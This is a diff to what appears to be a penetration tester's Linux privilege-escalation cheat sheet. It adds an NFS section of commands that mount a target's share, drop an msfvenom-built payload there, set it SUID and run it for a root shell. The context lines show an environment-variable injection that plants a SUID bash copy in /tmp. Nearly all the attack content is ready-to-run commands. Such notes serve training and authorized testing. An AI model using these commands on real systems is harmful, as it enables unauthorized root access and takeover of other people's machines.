@@ -250,6 +250,17 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 /tmp/rootbash -p
 ```
 
+## NFS ✅
+```bash
+cat /etc/exports # target machine
+mkdir /tmp/nfs # our kali
+mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs # our kali
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf # our kali
+chmod +xs /tmp/nfs/shell.elf # our kali
+/tmp/shell.elf # target machine
+```
+
+
 #### The following list shows the most commons file extensions for linux: ❗️☪️
 ```bash
 .a   : a static library ;
